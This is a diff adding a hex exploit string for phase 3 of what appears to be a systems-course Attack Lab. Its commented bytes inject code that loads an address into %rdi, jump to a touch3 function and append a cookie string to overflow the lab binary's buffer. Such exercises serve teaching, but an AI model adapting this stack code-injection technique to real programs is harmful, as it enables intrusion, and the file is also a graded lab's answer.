@@ -1,0 +1,13 @@
+/* Phase 3 Attack Lab Exploit String */
+/* Set %rdi to 0x28(%rsp) and return */
+48 c7 c7 80 25 64 55 /* 7 Char */
+68 5e 1a 40 00 c3    /* 6 char */
+/* Buffer */
+00 00 00
+00 00 00 00 00 00 00 00
+/* Push %rsp */
+58 25 64 55 00 00 00 00
+/* Touch3 Address: 0x401a5e */
+68 5e 1a 40 00 00 00 00
+/* Cookie in ASCII (Hex: 0x1f2e5b60) */
+31 66 32 65 35 62 36 30 00
